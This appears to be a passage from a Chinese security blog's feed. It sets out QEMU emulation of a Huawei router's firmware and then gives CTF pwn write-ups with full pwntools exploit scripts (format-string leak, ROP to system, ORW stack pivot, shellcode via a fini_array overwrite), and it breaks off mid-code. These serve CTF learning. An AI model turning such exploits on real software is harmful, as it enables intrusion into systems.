    <updated>2023-09-14T17:21:05.389Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在经历了一年的glibc学习 终于也是开始接触到了真正的二进制 怀着激动的心情 开始Iot的旅途！<br>本文用来收录不属于cve复现中的虚拟环境搭建过程</p><h1 id="华为532e"><a href="#华为532e" class="headerlink" title="华为532e"></a>华为532e</h1><p>本次使用的固件是华为532e系列路由器<br>固件下载地址： <a href="https://github.com/CcccccccJun/cloud">https://github.com/CcccccccJun/cloud</a></p><p>首先使用binwalk来提取固件 这里要注意一下 如果binwalk没有提取到root文件夹 那么问题出在没有安装相应的文件系统<br>该固件需要安装的是sasquatch 配置好相关环境后可以成功提取到文件<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308090859342.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308090859342.png" alt="image.png"></a><br>随后我们将root目录打包成压缩文件 供等下上传到模拟系统中<br><code>tar -czvf 1.tar squashfs-root/</code><br>qemu模拟有多种形式 本次我们使用的是系统模拟 同时通过file观察任意的可执行文件 可以注意到该路由器使用的是MIPS架构<br>为此 我们需要准备MIPS的内核文件以及一个MIPS架构的虚拟机映像文件<br>可以在该网站上下载  <a href="https://people.debian.org/~aurel32/qemu/mips/">https://people.debian.org/~aurel32/qemu/mips/</a><br>随后我们需要创建一个TUN&#x2F;TAP虚拟网络接口 其可以在操作系统和用户空间之间进行网络数据包的传输 便于我们在虚拟机中连接到启动后的路由器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tunctl -t top0 -u root</span><br><span class="line">ifconfig top0 192.168.10.1</span><br></pre></td></tr></table></figure><p>我们给予的top0接口的ipv4地址的子网号可以为任意 同时要使用默认网关<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308090936146.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308090936146.png" alt="image.png"></a><br>随后我们利用qemu进行系统模拟<br><code>qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap,ifname=top0 -nographic</code><br>为qemu模拟出来的虚拟机增加了一个TAP设备的虚拟网络接口top0用于通信<br>默认的登录账号和密码都是root<br>我们将eth0接口配置和刚才top0接口相同的c段<br><code>ifconfig eth0 192.169.10.2</code><br>随后就可以在ubuntu中访问到debian虚拟机<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308090958896.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308090958896.png" alt="image.png"></a><br>随后我们利用scp把刚才打包好的压缩文件上传到debian虚拟机中<br><code>scp 1.tar root@192.168.10.2:/root/</code><br>但是这里报错了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308091008147.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308091008147.png" alt="image.png"></a><br>大概意思是debian虚拟机中的openssh禁用了ssh-dss算法<br>我们需要手动加上参数来允许</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp -oHostKeyAlgorithms=+ssh-dss 1.tar root@192.168.10.2:/root/</span><br></pre></td></tr></table></figure><p>随后回到debian虚拟机 利用<code>tar –zxvf 1.tar</code> 命令进行解压<br>接着我们需要将&#x2F;dev目录与squashfs-root目录进行绑定 使得可以访问到所需的设备文件<br>同理 将&#x2F;proc目录挂载到squashfs-root对应的目录下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -o bind /dev ./squashfs-root/dev</span><br><span class="line">mount -t proc /proc ./squashfs-root/proc/</span><br></pre></td></tr></table></figure><p>随后以squashfs-root目录为根目录 执行shell<br><code>chroot ./squashfs-root/ sh</code><br>由于在路由器启动后 eth0接口的ip地址会被更改 所以我们需要在启动路由器的过程中 重新配置eth0接口 这也就意味着我们需要连接两个会话<br>已有的会话是通过qemu模拟后直接生成的虚拟机 不会随着ip的更改而断开 而通过ssh连接的会话会因为ip受到影响<br>于是 我们需要在ssh的会话中启动路由器 随后这个ssh进程就会因为ip改变而卡住 然后我们再通过原本的会话重新配置eth0 就可以成功启动路由器的同时 保证我们的eth0还是原本的ip地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./bin/upnp</span><br><span class="line">./bin/mic</span><br></pre></td></tr></table></figure><p>启动路由器的环境</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308091028108.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308091028108.png" alt="image.png"></a><br>成功启动后 我们就可以在宿主机中访问到路由器了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308091029879.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308091029879.png" alt="image.png"></a><br>这里使用360浏览器是因为其他浏览器不支持TLS1.0的协议 导致无法成功访问</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>NssCTF round14</title>
    <link href="http://example.com/2023/07/30/NssCTF-round14/"/>
    <id>http://example.com/2023/07/30/NssCTF-round14/</id>
    <published>2023-07-30T08:31:02.000Z</published>
    <updated>2023-09-14T17:21:09.033Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="love"><a href="#love" class="headerlink" title="love"></a>love</h2><p>这题可以非预期 但是由于时间比较充裕 就按照出题人的意思来做一做</p><p>比较简单的一题 难点在于最后的破坏了tls结构体的时候 不能选择system函数 要用syscall 但是稍微修复一下tls结构体 还是可以调用system函数的</p><p>考点在于pthread_create会使得新线程栈的布局迁移到tls结构体附近的一块地址 导致我们可以通过栈溢出覆盖到tls的canary 从而来绕过canary</p><p>修复tls结构体只需要把fs:0x10处的值覆盖成addr+0x308后是一个可读的地址即可</p><p>自己调一调就可以懂了</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> pwn_pb2</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.anna.nssctf.cn&quot;</span>,<span class="number">28092</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;I want to hear your praise of Toka&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;%520c%9$n%17$p&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x40131B&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x401290&#x27;)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;\xc0&quot;</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">243</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">fs_base = libc_addr - <span class="number">0x3900</span></span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">rdi_addr = <span class="built_in">next</span>(elf.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>)))</span><br><span class="line">ret_addr = <span class="built_in">next</span>(elf.search(asm(<span class="string">&quot;ret&quot;</span>)))</span><br><span class="line">io.recvuntil(<span class="string">&quot;I know you like him, but you must pass my level&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x28</span>)+p64(<span class="number">0x100</span>)+cyclic(<span class="number">0x8</span>)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)+cyclic(<span class="number">0x840</span>-<span class="number">0x30</span>-<span class="number">0x28</span>)+cyclic(<span class="number">0x10</span>)+p64(elf.bss(<span class="number">0x200</span>))+cyclic(<span class="number">0x10</span>)+<span class="string">b&#x27;\x00\x01\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io,f&#x27;b *&#123;libc_addr+0x10ca1e&#125;&#x27;)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="rbp"><a href="#rbp" class="headerlink" title="rbp"></a>rbp</h2><p>劫持rbp可以任意写 然后就是打orw 没什么好说的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> pwn_pb2</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node3.anna.nssctf.cn&quot;,28092)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;try it&quot;</span>)</span><br><span class="line">ptr_read = <span class="number">0x401292</span></span><br><span class="line">bss_addr = elf.bss(<span class="number">0x800</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x210</span>)+p64(bss_addr+<span class="number">0x210</span>)+p64(ptr_read)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">rdi_addr = <span class="built_in">next</span>(elf.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>)))</span><br><span class="line">rbp_addr = <span class="built_in">next</span>(elf.search(asm(<span class="string">&quot;pop rbp;ret&quot;</span>)))</span><br><span class="line">leave_addr = <span class="built_in">next</span>(elf.search(asm(<span class="string">&quot;leave;ret&quot;</span>)))</span><br><span class="line">puts_plt = elf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(rbp_addr)+p64(bss_addr+<span class="number">0x510</span>)+p64(ptr_read)+<span class="string">b&#x27;./flag\x00\x00&#x27;</span>+cyclic(<span class="number">0x210</span>-<span class="number">0x38</span>)+p64(bss_addr-<span class="number">0x8</span>)+p64(leave_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x4012C0&#x27;)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">rsi_addr = libc_addr + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rsi;ret&quot;</span>)))</span><br><span class="line">rdx_addr = libc_addr + <span class="number">0x0000000000142c92</span></span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">open_addr = libc_addr + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">write_addr = libc_addr + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">flag_addr = bss_addr+<span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">payload = p64(rdi_addr)+p64(flag_addr)+p64(rsi_addr)+p64(<span class="number">0</span>)+p64(open_addr)</span><br><span class="line">payload += p64(rdi_addr)+p64(<span class="number">3</span>)+p64(rsi_addr)+p64(bss_addr+<span class="number">0x600</span>)+p64(rdx_addr)+p64(<span class="number">0x100</span>)+p64(read_addr)</span><br><span class="line">payload += p64(rdi_addr)+p64(<span class="number">1</span>)+p64(rsi_addr)+p64(bss_addr+<span class="number">0x600</span>)+p64(write_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x210</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(bss_addr+<span class="number">0x300</span>-<span class="number">0x8</span>)+p64(leave_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x4012C0&#x27;)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recv()</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure><h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307312214981.png" title="image-20230731221415889" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307312214981.png" alt="image-20230731221415889"></a></p><p>保护全关了 可用的攻击手法变得多元化起来了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+7h] [rbp-9h] BYREF</span></span><br><span class="line">  _BYTE *v5; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="keyword">while</span> ( flag &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;addr: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%p&quot;</span>, &amp;v5);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot; %hhx&quot;</span>, &amp;v4);</span><br><span class="line">    xorByteWithAddress(v5, v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序的主体逻辑很简单 </p><p>就是可以向一个任意地址 进行一次单字节的异或的操作</p><p>但是由于while循环的条件是flag小于等于0</p><p>执行完xorByteWithAddress函数后 flag的值自增 就退出while循环</p><p>所以我们首要的思路就是想办法把flag的值修改成负数</p><p>随后往bss段上写入shellcode 利用main函数结束会调用隐式exit函数 中间利用call函数调用了fini_array</p><p>通过覆盖fini_array就可以调用到shellcode</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> pwn_pb2</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node3.anna.nssctf.cn&quot;,28092)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">fini_addr = <span class="number">0x600970</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">addr,xor_message</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;addr: &quot;</span>)</span><br><span class="line">    got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">    io.sendline(addr)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;value: &quot;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(io,&#x27;b *0x400738&#x27;)</span></span><br><span class="line">    io.sendline(xor_message)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss_addr =elf.bss(<span class="number">0x300</span>)</span><br><span class="line">shellcode = [<span class="string">&#x27;48&#x27;</span>,<span class="string">&#x27;31&#x27;</span>,<span class="string">&#x27;f6&#x27;</span>,<span class="string">&#x27;56&#x27;</span>,<span class="string">&#x27;48&#x27;</span>,<span class="string">&#x27;bf&#x27;</span>,<span class="string">&#x27;2f&#x27;</span>,<span class="string">&#x27;62&#x27;</span>,<span class="string">&#x27;69&#x27;</span>,<span class="string">&#x27;6e&#x27;</span>,<span class="string">&#x27;2f&#x27;</span>,<span class="string">&#x27;2f&#x27;</span>,<span class="string">&#x27;73&#x27;</span>,<span class="string">&#x27;68&#x27;</span>,<span class="string">&#x27;57&#x27;</span>,<span class="string">&#x27;54&#x27;</span>,<span class="string">&#x27;5f&#x27;</span>,<span class="string">&#x27;6a&#x27;</span>,<span class="string">&#x27;3b&#x27;</span>,<span class="string">&#x27;58&#x27;</span>,<span class="string">&#x27;99&#x27;</span>,<span class="string">&#x27;0f&#x27;</span>,<span class="string">&#x27;05&#x27;</span>]</span><br><span class="line">xor(<span class="string">&quot;600BCf&quot;</span>,<span class="string">&quot;ff&quot;</span>)</span><br><span class="line">addr = <span class="string">&quot;600ea0&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> shellcode:</span><br><span class="line">    xor(addr,i)</span><br><span class="line">    num = <span class="built_in">int</span>(addr, <span class="number">16</span>)</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    addr = <span class="built_in">format</span>(num, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(addr)</span><br><span class="line">xor(<span class="string">&quot;600970&quot;</span>,<span class="string">&quot;b0&quot;</span>)</span><br><span class="line">xor(<span class="string">&quot;600971&quot;</span>,<span class="string">&quot;8&quot;</span>)</span><br><span class="line">xor(<span class="string">&quot;600972&quot;</span>,<span class="string">&quot;20&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *_dl_fini+524&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">xor(<span class="string">&quot;600Bcf&quot;</span>,<span class="string">&quot;ff&quot;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="wp" scheme="http://example.com/categories/wp/"/>
    
    
  </entry>
  
  <entry>
    <title>星ctf2023</title>
    <link href="http://example.com/2023/07/30/%E6%98%9Fctf2023/"/>
    <id>http://example.com/2023/07/30/%E6%98%9Fctf2023/</id>
    <published>2023-07-29T17:29:23.000Z</published>
    <updated>2023-09-14T17:21:07.486Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>比赛名应该是*ctf 但是由于我hexo框架不能命名为 * 所以只能叫星了</p><h2 id="fcalc"><a href="#fcalc" class="headerlink" title="fcalc"></a>fcalc</h2><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307300137270.png" title="image-20230730013704199" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307300137270.png" alt="image-20230730013704199"></a></p><p>没有开启NX保护 第一反应就是要打shellcode</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// rsp</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// rsp</span></span><br><span class="line">  <span class="type">double</span> *v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+14h] [rbp-44h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-40h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">double</span> *v9; <span class="comment">// [rsp+20h] [rbp-38h]</span></span><br><span class="line">  <span class="type">void</span> *s; <span class="comment">// [rsp+28h] [rbp-30h]</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+30h] [rbp-28h]</span></span><br><span class="line">  <span class="type">double</span> v12; <span class="comment">// [rsp+38h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+40h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = alloca(<span class="number">400LL</span>);</span><br><span class="line">  s = (<span class="number">16</span> * ((&amp;v6 + <span class="number">3</span>) &gt;&gt; <span class="number">4</span>));</span><br><span class="line">  v4 = alloca(<span class="number">64LL</span>);</span><br><span class="line">  buf = s;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x180</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  qword_40E0 = s;</span><br><span class="line">  dword_4010 = <span class="number">0</span>;</span><br><span class="line">  sub_1384();</span><br><span class="line">  say();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = read(<span class="number">0</span>, buf, <span class="number">0x180</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt; <span class="number">47</span> )</span><br><span class="line">      v6 = <span class="number">48</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6 &amp;&amp; *(buf + i) != <span class="string">&#x27;\n&#x27;</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(buf + i) &lt;= <span class="number">0x20</span> || *(buf + i) &gt; <span class="number">0x30</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(buf + i) &gt; <span class="number">0x2F</span> &amp;&amp; *(buf + i) &lt;= <span class="number">0x39</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( dword_4010 &gt; <span class="number">47</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          ++dword_4010;</span><br><span class="line">          v5 = qword_40E0;</span><br><span class="line">          *v5 = atof(buf + i);</span><br><span class="line">          qword_40E0 += <span class="number">8LL</span>;</span><br><span class="line">          <span class="keyword">while</span> ( *(buf + i + <span class="number">1</span>) == <span class="number">0x2E</span> || *(buf + i + <span class="number">1</span>) &gt; <span class="number">0x2F</span> &amp;&amp; *(buf + i + <span class="number">1</span>) &lt;= <span class="number">0x39</span> )</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                      <span class="comment">// (0x20,0x30]</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( dword_4010 &lt;= <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        v9 = s;</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">47</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          v12 = <span class="built_in">fabs</span>(*v9);</span><br><span class="line">          <span class="keyword">if</span> ( v12 != <span class="number">0.0</span> &amp;&amp; (v12 &lt; <span class="number">1.0</span> || v12 &gt; <span class="number">100.0</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ERROR: %lf\n&quot;</span>, v12);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          ++v9;</span><br><span class="line">        &#125;</span><br><span class="line">        (qword_4060[*(buf + i) - <span class="number">0x20</span>])();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( s &lt; qword_40E0 )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Result: %lf\n&quot;</span>, *(qword_40E0 - <span class="number">8</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先需要逆向出来和菜单交互的格式 我们需要使得dword_4010大于1 同时还要绕过这两个循环</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( *(buf + i + <span class="number">1</span>) == <span class="number">0x2E</span> || *(buf + i + <span class="number">1</span>) &gt; <span class="number">0x2F</span> &amp;&amp; *(buf + i + <span class="number">1</span>) &lt;= <span class="number">0x39</span> )</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">47</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          v12 = <span class="built_in">fabs</span>(*v9);</span><br><span class="line">          <span class="keyword">if</span> ( v12 != <span class="number">0.0</span> &amp;&amp; (v12 &lt; <span class="number">1.0</span> || v12 &gt; <span class="number">100.0</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ERROR: %lf\n&quot;</span>, v12);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          ++v9;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>第一个循环 相对来说容易 只需要在对应字符后面加上超出范围的字符即可</p><p>第二个循环限制比较大 对0x48个字长的空间都进行了check</p><p>随后呢根据输入的字符 取决调用哪个函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 (__fastcall *sub_1384())()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 (__fastcall *result)(); <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span 